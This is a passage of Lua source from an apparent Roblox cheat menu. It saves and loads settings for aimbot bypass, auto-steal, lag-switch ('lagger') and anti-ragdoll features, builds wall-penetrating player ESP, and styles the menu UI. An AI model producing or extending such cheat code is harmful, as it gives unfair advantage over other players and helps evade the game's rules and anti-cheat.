            if d2.kb and Enum.KeyCode[d2.kb] then e.kb=Enum.KeyCode[d2.kb] else e.kb=nil end
            if d2.gp and Enum.KeyCode[d2.gp] then e.gp=Enum.KeyCode[d2.gp] else e.gp=nil end
        end
        if d.dropBrainrotKey then lk(M.KB.DropBrainrot,d.dropBrainrotKey) end
        if d.autoLeftKey then lk(M.KB.AutoLeft,d.autoLeftKey) end
        if d.autoRightKey then lk(M.KB.AutoRight,d.autoRightKey) end
        if d.autoBatKey then lk(M.KB.AutoBat,d.autoBatKey) end
        if d.laggerToggleKey then lk(M.KB.LaggerToggle,d.laggerToggleKey) end
        if type(M.KB.LaggerCarry) ~= "table" then M.KB.LaggerCarry = {kb=nil, gp=nil} end
        if d.laggerCarryKey then lk(M.KB.LaggerCarry,d.laggerCarryKey) end
        if d.tpFloorKey then lk(M.KB.TPFloor,d.tpFloorKey) end
        if d.instaResetKey then lk(M.KB.InstaReset,d.instaResetKey) end
        if d.guiHideKey then lk(M.KB.GuiHide,d.guiHideKey) end
        if d.speedToggleKey then lk(M.KB.SpeedToggle,d.speedToggleKey) end
        if d.bypassAimbotKey then lk(M.KB.BypassAimbot,d.bypassAimbotKey) end
        if d.batTPKey then lk(M.KB.BatTP,d.batTPKey) end
        if d.batTPEnabled ~= nil then M.batTPEnabled = d.batTPEnabled == true end
        do
            local v = d.batTPVersion or d.batTpVersion or d.BatTPVersion or d.tpBatMode
            if type(v) == "number" then v = "V" .. tostring(math.floor(v)) end
            if type(v) == "string" then
                v = string.upper((tostring(v):gsub("%s+", "")))
                if v == "1" or v == "2" or v == "3" or v == "4" then v = "V" .. v end
                if v == "V1" or v == "V2" or v == "V3" or v == "V4" then
                    M.batTPVersion = v
                end
            end
        end
        if type(d.batTPSpeed)=="number" then M.batTPSpeed=d.batTPSpeed end
        if type(M.batTPVersion) ~= "string" or not ({V1=true,V2=true,V3=true,V4=true})[M.batTPVersion] then
            M.batTPVersion = "V1"
        end
        -- Keep exact saved version (including V4) for post-UI apply
        M._loadedBatTPVersion = M.batTPVersion
        if type(d.batAimbotVersion)=="string" and (d.batAimbotVersion=="V1" or d.batAimbotVersion=="V2") then M.batAimbotVersion=d.batAimbotVersion end
        if d.antiDieFlingEnabled ~= nil then M.antiDieFlingEnabled = d.antiDieFlingEnabled == true; M.antiDieEnabled = M.antiDieFlingEnabled end

        do
            local seenKb, seenGp = {}, {}
            local order = {
                M.KB.BypassAimbot, M.KB.BatTP, M.KB.AutoBat, M.KB.DropBrainrot, M.KB.SpeedToggle,
                M.KB.LaggerToggle, M.KB.LaggerCarry, M.KB.AutoLeft, M.KB.AutoRight, M.KB.TPFloor,
                M.KB.GuiHide, M.KB.InstaReset,
            }
            for _, e in ipairs(order) do
                if type(e) == "table" then
                    if e.kb then
                        if seenKb[e.kb] then e.kb = nil else seenKb[e.kb] = true end
                    end
                    if e.gp then
                        if seenGp[e.gp] then e.gp = nil else seenGp[e.gp] = true end
                    end
                end
            end
        end
    end
end

local saveCherryConfig
function saveCherryConfig()
    if type(writefile)~="function" then return end
    -- Cherry safety: never crash save if tables are missing
    M.Steal = M.Steal or { StealRadius = 61, StealDuration = 1.3, StopTime = 0.35, AutoStealEnabled = false }
    M.Semi = M.Semi or { holdMin = 1.3, holdMax = 2.6, entryDelay = 0.3, radius = 10, primeRange = 80 }
    M.KB = M.KB or {}
    CherryConfig = CherryConfig or { Theme = "Black White" }
    if not CHERRY_THEMES[CherryConfig.Theme] then CherryConfig.Theme = "Black White" end
    local function ks(e)
        if type(e) ~= "table" then return {kb=nil,gp=nil} end
        return {
            kb = (e.kb and e.kb.Name) or nil,
            gp = (e.gp and e.gp.Name) or nil,
        }
    end
    local _btnPosSave = M._btnPosCache
    if (type(_btnPosSave) ~= "table" or next(_btnPosSave) == nil) and M.loadBtnPositions then
        local okBp, resBp = pcall(function() return M.loadBtnPositions() end)
        if okBp and type(resBp) == "table" and next(resBp) ~= nil then _btnPosSave = resBp end
    end
    local cfg = {
        Theme=CherryConfig.Theme, colorScheme=M.colorScheme or CherryConfig.Theme, menuOpen=M.menuOpen~=false,

        normalSpeed=M.NS, carrySpeed=M.CS, laggerSpeed=M.LAGGER_SPEED,
        laggerCarrySpeed=M.LAGGER_CARRY_SPEED, bypassSpeed=M.BYPASS_SPEED, bypassCarrySpeed=M.BYPASS_CARRY_SPEED, speedMethod=M.speedMethod, speedUIMode="Original", speedBoosterEnabled=M.speedBoosterEnabled~=false, speedBoosterPath=M.speedBoosterPath or "Normal", speedBoosterPanelOpen=M.speedBoosterPanelOpen==true, grabRadius=M.Steal.StealRadius,
        stealDuration=M.Steal.StealDuration, stealStopTime=M.Steal.StopTime, stealMode=M.stealMode,
        autoTPHeight=M.autoTPHeight, fovValue=M.fovValue, uiScale=M.uiScale,
        infJumpMode=M.infJumpMode,
        mobileButtonsSize=M.mobileButtonsSize, mobileBtnVisible=M.mobileBtnVisible,
        uiColorName=M.uiColorName or "Ocean",
        customBgId=tonumber(M.customBgId) or 0, customBgOpacity=tonumber(M.customBgOpacity) or 0.35, customBgKey=M.customBgKey, bgImageIndex=tonumber(M.bgImageIndex) or 1,
        pingAlertEnabled=M.pingAlertEnabled==true, pingAlertThreshold=tonumber(M.pingAlertThreshold) or 120,
        mobBtnBgId=tonumber(M.mobBtnBgId) or 0, btnPos=_btnPosSave,
        stealBarSize=M.stealBarSize,
        stealBarStyle="New",
        stealBarPos=M.stealBarPos,
        carrySpeedActive=M.carrySpeedActive, laggerModeEnabled=M.laggerModeEnabled, laggerCarryActive=M.laggerCarryActive==true, speedCustomizerEnabled=M.speedCustomizerEnabled==true,
        autoSwing=M.autoSwingEnabled, introSoundEnabled=M.introSoundEnabled,
        introSongChoice=M.introSongChoice,
        introGUIEnabled=M.introGUIEnabled,
        headlessEnabled=M.headlessEnabled==true,
        skinPack=M.skinPack or "Off", katanaType="Off", katanaEnabled=false, headSkin="Off", uiLayoutMode=M.uiLayoutMode or "Vertical Top",
        vynxHornsEnabled=false,
        korbloxEnabled=M.korbloxEnabled==true,
        vynxWhiteSkinEnabled=false,
        vyncSkinEnabled=M.vyncSkinEnabled==true,
        wornAvatar=M.wornAvatar or "",
        avLogOutfitEnabled=M.avLogOutfitEnabled==true,
        animPack=M.animPack or "Vampire",
        animPackEnabled=M.animPackEnabled==true,
        nukeOptimizerEnabled=M.nukeOptimizerEnabled==true, dawgOptimizerEnabled=M.dawgOptimizerEnabled==true, bodyLockEnabled=M.bodyLockEnabled==true, bodyLockRadius=tonumber(M.bodyLockRadius) or 60,
        antiDieEnabled=M.antiDieEnabled==true,
        antiFlingEnabled=M.antiFlingEnabled==true,
        antiRagdollEnabled=M.antiRagdollEnabled==true,
        hardHitEnabled=M.hardHitEnabled==true,
        autoBatEnabled=M.autoBatEnabled==true,
        batAimbotMode=(M.batAimbotMode == "Bypass") and "Bypass" or "Normal",
        fpsBoostEnabled=M.fpsBoostEnabled==true,
        antiLagEnabled=M.antiLagEnabled==true,
        batCounterEnabled=M.batCounterEnabled==true,
        medusaCounterEnabled=M.medusaCounterEnabled==true,
        perfectHitEnabled=M.perfectHitEnabled~=false,
        autoLeftEnabled=M.autoLeftEnabled==true,
        autoRightEnabled=M.autoRightEnabled==true,
        autoTPEnabled=M.autoTPEnabled==true,
        autoRadiusEnabled=M.autoRadiusEnabled==true,
        removeAccEnabled=M.removeAccEnabled==true,
        safeModeEnabled=M.safeModeEnabled==true,
        unwalkEnabled=M.unwalkEnabled==true,
        enemyAvatarsEnabled=M.enemyAvatarsEnabled==true,
        lineESPEnabled=M.lineESPEnabled==true,
        speedESPEnabled=M.speedESPEnabled==true,
        tryardAnimEnabled=M.tryardAnimEnabled==true,
        bypassAimbotEnabled=M.bypassAimbotEnabled==true,
        softStealEnabled=M.softStealEnabled==true,
        AutoStealEnabled=M.Steal and M.Steal.AutoStealEnabled==true,

        ragdollGui=M.ragdollGuiEnabled, circleButtonsEnabled=M.circleButtonsEnabled,
        perButtonDrag=M.perButtonDragEnabled, mobileButtonsEnabled=M.mobileButtonsEnabled==true,
        medusaReset=M.medusaResetEnabled, autoMoveSwing=M.autoMoveSwingEnabled,
        autoSwitchSpeed=M.autoSwitchSpeedEnabled, autoTurnOffSpeed=M.autoTurnOffSpeedEnabled, autoSwitchLaggerSpeed=M.autoSwitchLaggerSpeedEnabled, autoCarryEnemyBase=M.autoCarryEnemyBaseEnabled, autoCarryEnemyBaseRange=M.autoCarryEnemyBaseRange, pingPanelOpen=false, killLaggerNivel=M.killLaggerNivel or "low", killLaggerOpen=M.killLaggerOpen~=false, killLaggerKey=M.killLaggerKey or "Delete", killLaggerLowKey=M.killLaggerLowKey or "M", killLaggerLocked=M.killLaggerLocked==true, pingPower=M.pingPower, pingMode=M.pingMode or "MID", pingInterval=M.pingInterval, pingKeybindKb=M.pingKeybindKb, pingKeybindGp=M.pingKeybindGp, pingAutoBrainrot=M.pingAutoBrainrot==true, pingBackground=M.pingBackground or 0, pingLocked=M.pingLocked==true, pingMinimized=M.pingMinimized==true, pingPanelPos=M.pingPanelPos, killLaggerPanelPos=M.killLaggerPanelPos, killLaggerMode=M.killLaggerMode or "LOW", panelBgImageId=tonumber(M.panelBgImageId) or 79162198517476, mobileButtonsLocked=M.mobileButtonsLocked==true, mobLayoutVer=M._mobLayoutVer or 21, customFont=M.customFontSelected, showPlayerSpeeds=M.showPlayerSpeeds,
        removeAcc=M.removeAccEnabled,
        playerESPEnabled=M.playerESPEnabled,
        autoStealEnabled=M.Steal.AutoStealEnabled,
        autoRadiusEnabled=M.autoRadiusEnabled,
        antiRagdoll=M.antiRagdollEnabled, hardHitEnabled=M.hardHitEnabled, hardHitRadius=M.hardHitRadius, antiRagdollMode=M.antiRagdollMode, infiniteJump=M.infJumpEnabled,
        medusaCounter=M.medusaCounterEnabled, batCounter=M.batCounterEnabled,
        unwalkEnabled=M.unwalkEnabled==true, antiDieEnabled=M.antiDieEnabled==true, antiFlingEnabled=M.antiFlingEnabled==true, antiFling=M.antiFlingEnabled==true, antiLag=M.antiLagEnabled==true, antiLagEnabled=M.antiLagEnabled==true, stretchEnabled=M.stretchEnabled==true, stretch=M.stretchEnabled==true, antiSummerBase=M.antiSummerBaseEnabled==true, antiSummerBaseEnabled=M.antiSummerBaseEnabled==true, uiLocked=M.uiLocked,
        autoTPEnabled=M.autoTPEnabled, mirrorTPDownEnabled=M.mirrorTPDownEnabled==true, perfectHitEnabled=M.perfectHitEnabled~=false,
        antiKick=false, safeMode=M.safeModeEnabled, autoBat=M.autoBatEnabled, vyncSkin=M.vyncSkinEnabled==true,
        semiHoldMin=M.Semi.holdMin, semiHoldMax=M.Semi.holdMax,
        semiEntryDelay=M.Semi.entryDelay,
        semiPrimeRange=M.Semi.primeRange,
        semiRadius=math.min(M.Semi.radius, 10),
        noPlayerCollision=M.noPlayerCollisionEnabled==true,
        lineESPEnabled=M.lineESPEnabled, highlightESPEnabled=false,
        speedESPEnabled=M.speedESPEnabled,
        autoResetOnDeath=M.autoResetOnDeath,
        animPack=M.animPack,
        headlessEnabled=M.headlessEnabled==true,
        skinPack=M.skinPack or "Off", uiLayoutMode=M.uiLayoutMode or "Vertical Top",
        korbloxEnabled=M.korbloxEnabled==true,
        vynxBlackSkinEnabled=false,
        bypassAimbotEnabled=M.bypassAimbotEnabled,
        tpBatHitMode=M.tpBatHitMode or "Sure", tpBatMode=M.tpBatMode or "V3",
        animPackEnabled=M.animPackEnabled==true,
        dropBrainrotKey=ks(M.KB.DropBrainrot), autoLeftKey=ks(M.KB.AutoLeft),
        autoRightKey=ks(M.KB.AutoRight), autoBatKey=ks(M.KB.AutoBat),
        laggerToggleKey=ks(M.KB.LaggerToggle), laggerCarryKey=ks(M.KB.LaggerCarry), tpFloorKey=ks(M.KB.TPFloor),
        instaResetKey=ks(M.KB.InstaReset), guiHideKey=ks(M.KB.GuiHide),
        speedToggleKey=ks(M.KB.SpeedToggle), bypassAimbotKey=ks(M.KB.BypassAimbot), batTPKey=ks(M.KB.BatTP), batTPEnabled=M.batTPEnabled==true, batTPSpeed=M.batTPSpeed or 58, batTPVersion=(function() local v=tostring(M.batTPVersion or "V1"):upper():gsub("%s+",""); if v=="1"or v=="2"or v=="3"or v=="4" then v="V"..v end; if v~="V1"and v~="V2"and v~="V3"and v~="V4" then return "V1" end; return v end)(), batAimbotVersion=M.batAimbotVersion or "V1", antiDieFlingEnabled=M.antiDieFlingEnabled==true,
    }
    pcall(function() writefile(CHERRY_CONFIG_NAME, HS:JSONEncode(cfg)) end)
end

M.saveConfig = saveCherryConfig

local RunService2 = game:GetService("RunService")
local cherryESPState = { LineESP=false, SpeedESP=false, HighlightESP=false }
local cherryESPObjects = {}
local DrawingAvailable = false
pcall(function() DrawingAvailable = Drawing and type(Drawing.new)=="function" end)

local function cherryRemoveESP(p)
    local r = cherryESPObjects[p]
    if not r then return end
    for _,o in pairs(r) do pcall(function()
        if typeof(o)=="Instance" then o:Destroy()
        elseif o.Remove then o:Remove() end
    end) end
    cherryESPObjects[p]=nil
end

local function cherryGetSpeed(root)
    local v
    pcall(function() v=root.AssemblyLinearVelocity end)
    if not v then pcall(function() v=root.Velocity end) end
    if not v then return 0 end
    return Vector3.new(v.X,0,v.Z).Magnitude
end

local function cherryCreateESP(p)
    if cherryESPObjects[p] then return cherryESPObjects[p] end
    local r={}
    local hl=Instance.new("Highlight")
    hl.FillTransparency=0.55; hl.OutlineTransparency=0
    local _hl = (UI_ACCENT or (M.getThemeAccent and M.getThemeAccent()) or Color3.fromRGB(255, 255, 255))
    hl.FillColor=_hl
    hl.OutlineColor=_hl
    hl.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop
    hl.Enabled=false; hl.Parent=workspace
    r.Highlight=hl
    local bb=Instance.new("BillboardGui")
    bb.Size=UDim2.fromOffset(150,32); bb.StudsOffset=Vector3.new(0,3.25,0)
    bb.AlwaysOnTop=true; bb.Enabled=false; bb.ResetOnSpawn=false
    bb.Parent=player:WaitForChild("PlayerGui")
    local sl=Instance.new("TextLabel",bb)
    sl.Size=UDim2.fromScale(1,1); sl.BackgroundTransparency=1; sl.Text="0.0 spd"
    sl.TextStrokeColor3=Color3.new(0,0,0); sl.TextStrokeTransparency=0
    sl.Font=Enum.Font.GothamBlack; sl.TextSize=18
    sl.TextXAlignment=Enum.TextXAlignment.Center; sl.TextYAlignment=Enum.TextYAlignment.Center
    r.Billboard=bb; r.SpeedText=sl
    if DrawingAvailable then
        local ln=Drawing.new("Line")
        ln.Visible=false; ln.Thickness=2.75; ln.Transparency=1
        r.Line=ln
    end
    cherryESPObjects[p]=r
    return r
end

Players.PlayerRemoving:Connect(function(p) cherryRemoveESP(p) end)

local function themeDarkFromAccent(accent, amount)
    return M.themeDarkFromAccent(accent, amount)
end

local function isNearBlack(c, threshold)
    if typeof(c) ~= "Color3" then return false end
    threshold = threshold or 0.14
    return c.R <= threshold and c.G <= threshold and c.B <= threshold
end

local function applyAccentFromTheme()

    local name = "Black White"
    CherryConfig.Theme = name
    M.colorScheme = name
    M._savedTheme = name
    local t = CHERRY_THEMES["Black White"] or {
        Accent=Color3.fromRGB(0, 130, 200), AccentDim=Color3.fromRGB(0, 82, 130),
        Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(16,16,16),
        Shell=Color3.fromRGB(12,12,12), ShellTrans=0.05,
        Stroke=Color3.fromRGB(0,0,0), Overlay=Color3.fromRGB(0,0,0),
    }

    local accent = (M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200)
    local dim = (M.accentDim and M.accentDim()) or accent:Lerp(Color3.fromRGB(0, 0, 0), 0.35)
    local bg  = Color3.fromRGB(0, 0, 0)
    local row = Color3.fromRGB(12, 12, 14)
    local btn = Color3.fromRGB(10, 10, 12)
    local gradTop = Color3.fromRGB(0, 0, 0)
    local gradBot = Color3.fromRGB(0, 0, 0)

    CHERRY_ACCENT = accent
    UI_ACCENT = accent
    M.bgImageColor = accent
    UI_ACCENT_DIM = dim
    UI_BG_DARK = bg
    UI_ROW_BG = row
    UI_BTN_BG = btn
    UI_TOGGLE_OFF = Color3.fromRGB(40, 40, 48)
    UI_TOGGLE_KNOB = Color3.fromRGB(255, 255, 255)
    UI_KNOB_ON = Color3.fromRGB(255, 255, 255)
    UI_TEXT_PRIMARY = Color3.fromRGB(255, 255, 255)
    UI_TEXT_WHITE = Color3.fromRGB(255, 255, 255)
    UI_TEXT_DIM = Color3.fromRGB(185, 185, 185)
    UI_TEXT_SECTION = Color3.fromRGB(255, 255, 255)
    UI_CARD_STROKE = Color3.fromRGB(46, 46, 46)
    UI_GRAD_TOP = gradTop
    UI_GRAD_BOT = gradBot
    UI_SHELL = Color3.fromRGB(10, 10, 10)
    UI_SHELL_TRANS = 0
    UI_OVERLAY = Color3.fromRGB(0, 0, 0)
    UI_STROKE = Color3.fromRGB(40, 40, 45)

    M.Theme = {
        Name = name,
        Accent = accent,
        AccentDim = dim,
        Bg = bg,
        Row = row,
        Shell = UI_SHELL,
        Stroke = UI_STROKE,
    }
    pcall(function()
        if M.applyChromeTheme then M.applyChromeTheme() end
        if M.refreshMobileButtonTheme then M.refreshMobileButtonTheme() end
        if M.refreshVynxBrandColors then M.refreshVynxBrandColors() end
                    if M.recolorLiveAccents then M.recolorLiveAccents() end
        if M.refreshTopBannerTheme then M.refreshTopBannerTheme() end

        if M.recolorLiveAccents then M.recolorLiveAccents() end
        if M.applyStealBarTheme then M.applyStealBarTheme(UI_ACCENT) end
        if M.updateHeadTheme then M.updateHeadTheme() end
        if M.mobileButtonsEnabled and M.buildMobileButtons then M.buildMobileButtons() end
        if player.Character and M.applyVynxBlackSkin then

            pcall(function() M.attachVynxBellyTag(player.Character) end)
            pcall(function() M.attachVynxPantsTag(player.Character) end)
            -- hat optional; no VYNX text tags
        end
    end)
end

function M.applyChromeTheme()

    local chrome = Color3.fromRGB(0, 0, 0)
    local chromeDeep = Color3.fromRGB(6, 10, 16)
    local chromeBright = Color3.fromRGB(255, 255, 255)
    local tabOn = Color3.fromRGB(12, 18, 28)
    local tabOff = Color3.fromRGB(0, 0, 0)
    local strokeCol = Color3.fromRGB(40, 140, 255)

    local hdr = M.headerPanel
    if hdr and hdr.Parent then
        hdr.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        hdr.BackgroundTransparency = 1
        local fade = hdr:FindFirstChild("HeaderFade")
        if fade then fade.BackgroundTransparency = 1 end

        local title = hdr:FindFirstChild("TitleLbl") or M.headerTitleLbl
        if title and title:IsA("TextLabel") then
            title.Visible = true
            title.RichText = false
            title.RichText = true
            title.Text = M.headerTitleRich()
            title.Position = UDim2.new(0, 58, 0, 6)
            title.Size = UDim2.new(1, -120, 0, 28)
            title.BackgroundTransparency = 1
            title.TextColor3 = Color3.fromRGB(255, 255, 255)
            title.TextTransparency = 0
            title.TextSize = 24
            local og = title:FindFirstChild("TitleOceanGrad")
            if og then pcall(function() og:Destroy() end) end
            title.Font = Enum.Font.GothamBlack
            title.TextXAlignment = Enum.TextXAlignment.Left
            title.ZIndex = 50
        end
        local disc = hdr:FindFirstChild("HeaderDiscord") or M.headerDiscordLbl
        if disc and disc:IsA("TextLabel") then
            disc.Visible = true
            disc.Text = "discord.gg/vynxduels"
            disc.Position = UDim2.new(0, 58, 0, 34)
            disc.Size = UDim2.new(1, -110, 0, 20)
            disc.BackgroundTransparency = 1
            disc.TextColor3 = Color3.fromRGB(255, 255, 255)
            pcall(function() disc:SetAttribute("NoTheme", true) end)
            for _, c in ipairs(disc:GetChildren()) do
                if c:IsA("UIGradient") then pcall(function() c:Destroy() end) end
            end
            disc.TextTransparency = 0
            disc.TextStrokeTransparency = 1
            disc.TextSize = 14
            disc.Font = Enum.Font.GothamBold
            disc.TextXAlignment = Enum.TextXAlignment.Left
            disc.ZIndex = 50
        end
        local oldMini = hdr:FindFirstChild("MiniLogo")
        if oldMini then pcall(function() oldMini:Destroy() end) end
        local vh = hdr:FindFirstChild("VHLogo") or M.headerMiniLogo
        if vh and vh.Parent then
            pcall(function()
                vh.Visible = true
                vh.BackgroundTransparency = 1
                vh.Size = UDim2.new(0, 48, 0, 48)
                for _, c in ipairs(vh:GetChildren()) do
                    if c:IsA("UIStroke") or c.Name == "LogoStroke" or c.Name == "LogoGlow" then
                        pcall(function() c:Destroy() end)
                    end
                end
                local vLbl = vh:FindFirstChild("LogoV")
                if vLbl then
                    vLbl.TextColor3 = Color3.fromRGB(90, 185, 255)
                    vLbl.TextSize = 28
                end
                local hLbl = vh:FindFirstChild("LogoH")
                if hLbl then
                    hLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
                    hLbl.TextSize = 28
                end
            end)
        end
        for _, c in ipairs(hdr:GetChildren()) do
            if tostring(c.Name):find("TitleOutline", 1, true)
                or c.Name == "TitleStripe1" or c.Name == "TitleStripe2" or c.Name == "TitleShadow" then
                pcall(function() c:Destroy() end)
            end
        end
        local minB = hdr:FindFirstChild("CloseBtn")
        if minB then
            minB.Text = "×"
            minB.TextColor3 = Color3.fromRGB(180, 200, 220)
            minB.BackgroundTransparency = 1
            minB.Size = UDim2.new(0, 32, 0, 28)
            pcall(function() minB:SetAttribute("NoTheme", true) end)
            for _, c in ipairs(minB:GetChildren()) do
                if c:IsA("UICorner") or c:IsA("UIStroke") then pcall(function() c:Destroy() end) end
            end
        end
        local closeL = hdr:FindFirstChild("CloseBtnLeft")
        if closeL then pcall(function() closeL:Destroy() end) end
        M.destroyMenuBtn = nil
    end
    local side = M.sideBarPanel
    if side and side.Parent then
        side.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        side.BackgroundTransparency = 1
        local ss = side:FindFirstChildOfClass("UIStroke")
        if ss then ss.Color = strokeCol; ss.Transparency = 1 end
        for _, c in ipairs(side:GetChildren()) do
            if c.Name == "SideFill" or c.Name == "LeftAccent" or (c:IsA("Frame") and c.Size.X.Offset == 16 and c.Size.Y.Scale == 1) then
                c.BackgroundColor3 = chromeDeep
            end
        end
    end
    if M.tabButtonRefs then
        local cur = M._currentTabName
        for name, btn in pairs(M.tabButtonRefs) do
            if btn and btn.Parent and M.styleTab then
                pcall(function() M.styleTab(btn, name == cur) end)
            end
        end
    end
    if M.mainFrame then
        local ms = M.mainFrame:FindFirstChild("MainStroke")
        if ms then
            ms.Color = strokeCol
            ms.Thickness = 1.6
            ms.Transparency = 0.25
            for _, c in ipairs(ms:GetChildren()) do
                if c:IsA("UIGradient") then pcall(function() c:Destroy() end) end
            end
        end
        -- keep shared background image
        pcall(function()
            if M.applySharedBackground then M.applySharedBackground() end
        end)
    end
    -- CategoryBar top strip chrome
    if M.categoryBar and M.categoryBar.Parent then
        M.categoryBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        M.categoryBar.BackgroundTransparency = 0.35
        local cs = M.categoryBar:FindFirstChildOfClass("UIStroke")
        if not cs then
            cs = Instance.new("UIStroke")
            cs.Parent = M.categoryBar
        end
        cs.Color = strokeCol
        cs.Thickness = 1
        cs.Transparency = 0.55
    end
    pcall(function()
        if M.applyStealBarTheme then M.applyStealBarTheme(UI_ACCENT) end
        if M.updateHeadTheme then M.updateHeadTheme() end
        if M.refreshMobileButtonTheme then M.refreshMobileButtonTheme() end
    if M.recolorLiveAccents then M.recolorLiveAccents() end
    end)
end
function M.recolorBlacksToTheme(root)
    if not root then return end
    local bg = UI_BG_DARK or themeDarkFromAccent(UI_ACCENT or Color3.new(1,1,1), 0.10)
    local row = UI_ROW_BG or themeDarkFromAccent(UI_ACCENT or Color3.new(1,1,1), 0.18)
    local btn = UI_BTN_BG or themeDarkFromAccent(UI_ACCENT or Color3.new(1,1,1), 0.22)
    local accent = UI_ACCENT or Color3.new(1,1,1)
    local dim = UI_ACCENT_DIM or accent

    local function recolor(obj)
        if obj:IsA("GuiObject") then
            local n = obj.Name or ""
            if n == "StealBar" or n == "StealBadge" or n == "Fill" or n == "CloseBtn" then return end
            if obj:GetAttribute("NoTheme") then return end
            local ok, col = pcall(function() return obj.BackgroundColor3 end)
            if ok and isNearBlack(col) then

                if obj:IsA("Frame") and (obj.Name == "Main" or obj.Name == "MainFrame" or obj.Size.X.Scale >= 0.9) then
                    obj.BackgroundColor3 = bg
                elseif obj:IsA("TextButton") or obj:IsA("ImageButton") then
                    obj.BackgroundColor3 = btn
                else
                    obj.BackgroundColor3 = row
                end
            end
        end
        if obj:IsA("UIStroke") then
            local ok, col = pcall(function() return obj.Color end)
            if ok and isNearBlack(col, 0.25) then
                obj.Color = dim
            end
        end
        if obj:IsA("UIGradient") then
            pcall(function()
                obj.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, UI_GRAD_TOP or gradTop or row),
                    ColorSequenceKeypoint.new(1, UI_GRAD_BOT or bg),
                })
            end)
        end
    end

    recolor(root)
    for _, d in ipairs(root:GetDescendants()) do
        recolor(d)
    end
end

local CHERRY_ACCENT = (CHERRY_THEMES[CherryConfig.Theme] or CHERRY_THEMES["Black White"] or {}).Accent or Color3.fromRGB(0, 130, 200)


function M.trackConn(conn) table.insert(M._persistentConns,conn); return conn end
function M.clearPersistentConns()
    for _,c in ipairs(M._persistentConns) do pcall(function() c:Disconnect() end) end
    M._persistentConns={}
end

function M.makeNumberCallback(tbl,key,min,max)
    return function(v)
        if min and v<min then return end
        if max and v>max then return end
        tbl[key]=v
        if key=="mobileButtonsSize" and M.mobileButtonsEnabled then M.buildMobileButtons() end
        if key=="stealBarSize" then M.buildStatusUI() end
        saveCherryConfig()
    end
end

UI_ACCENT       = UI_ACCENT       or Color3.fromRGB(40, 140, 255)
UI_ACCENT_DIM   = UI_ACCENT_DIM   or Color3.fromRGB(20, 80, 160)
UI_BG_DARK      = UI_BG_DARK      or Color3.fromRGB(0, 0, 0)
UI_ROW_BG       = UI_ROW_BG       or Color3.fromRGB(0, 0, 0)
UI_CARD_STROKE  = UI_CARD_STROKE  or Color3.fromRGB(66, 66, 66)
UI_TEXT_WHITE   = UI_TEXT_WHITE   or Color3.fromRGB(255, 255, 255)
UI_TEXT_PRIMARY = UI_TEXT_PRIMARY or Color3.fromRGB(255, 255, 255)
UI_TEXT_DIM     = UI_TEXT_DIM     or Color3.fromRGB(210, 210, 215)
UI_TEXT_SECTION = UI_TEXT_SECTION or Color3.fromRGB(255, 255, 255)
UI_BTN_BG       = UI_BTN_BG       or Color3.fromRGB(0, 0, 0)
UI_TOGGLE_OFF   = UI_TOGGLE_OFF   or Color3.fromRGB(40, 40, 48)
UI_TOGGLE_KNOB  = UI_TOGGLE_KNOB  or Color3.fromRGB(255, 255, 255)
UI_KNOB_ON      = UI_KNOB_ON      or Color3.fromRGB(255, 255, 255)
UI_GRAD_TOP     = UI_GRAD_TOP     or Color3.fromRGB(0, 0, 0)
UI_GRAD_BOT     = UI_GRAD_BOT     or Color3.fromRGB(0, 0, 0)

M._applyAccentFromTheme = applyAccentFromTheme
M._saveCherryConfig = saveCherryConfig
pcall(applyAccentFromTheme)

local UI_TWEEN_FAST = TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
local UI_TWEEN_MED  = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)

local function uiCardStyle(f)

    f.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
    f.BackgroundTransparency = 0
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 12); c.Parent = f
    local s = Instance.new("UIStroke"); s.Thickness = 1; s.Color = Color3.fromRGB(28, 28, 32); s.Transparency = 0.35; s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; s.Parent = f
end

local function uiSmallBtn(p)
    local b = Instance.new("TextButton")
    b.Position = p.Pos or UDim2.new(0,0,0,0); b.Size = p.Size or UDim2.new(0,40,0,23)
    b.BackgroundColor3 = p.Bg or UI_BTN_BG; b.BorderSizePixel = 0
    b.Text = p.Text or ""; b.TextColor3 = p.Col or UI_TEXT_DIM; b.TextSize = p.TS or 11
    b.Font = Enum.Font.GothamBold; b.AutoButtonColor = false; b.ZIndex = p.Z or 1; b.Parent = p.Parent
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,p.CR or 6); c.Parent = b
    return b
end

local function uiAccentBar(parent, on)
    local b = Instance.new("Frame")
    b.Name = "AccentBar"
    b.Position = UDim2.new(0,0,0.5,-11); b.Size = UDim2.new(0,3,0,22)
    b.BackgroundColor3 = on and UI_ACCENT or Color3.fromRGB(0, 130, 200)
    b.BackgroundTransparency = on and 0 or 1; b.BorderSizePixel = 0; b.Parent = parent
    b:SetAttribute("ThemeAccent", true)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,2); c.Parent = b
    return b
end

local function uiAutoCanvas(scroll)
    local lay = scroll:FindFirstChildOfClass("UIListLayout"); if not lay then return end
    local pad = scroll:FindFirstChildOfClass("UIPadding")
    local function upd()
        local padBottom = (pad and pad.PaddingBottom.Offset or 0)
        local padTop = (pad and pad.PaddingTop.Offset or 0)
        local h = lay.AbsoluteContentSize.Y + padBottom + padTop + 24
        scroll.CanvasSize = UDim2.new(0, 0, 0, math.max(h, 1))
    end
    lay:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(upd)
    task.defer(upd)
    task.delay(0.15, upd)
    task.delay(0.5, upd)
end

local function uiSectionHeader(parent, text)

    local r = Instance.new("Frame"); r.Name = "SectionHeader"; r.Size = UDim2.new(1,0,0,26); r.BackgroundTransparency = 1; r.Parent = parent
    local l = Instance.new("TextLabel"); l.Position = UDim2.new(0, 10, 0, 0); l.Size = UDim2.new(1, -14, 1, 0)
    l.BackgroundTransparency = 1
    l.Text = string.upper(tostring(text or ""))
    l.TextColor3 = Color3.fromRGB(255, 255, 255)
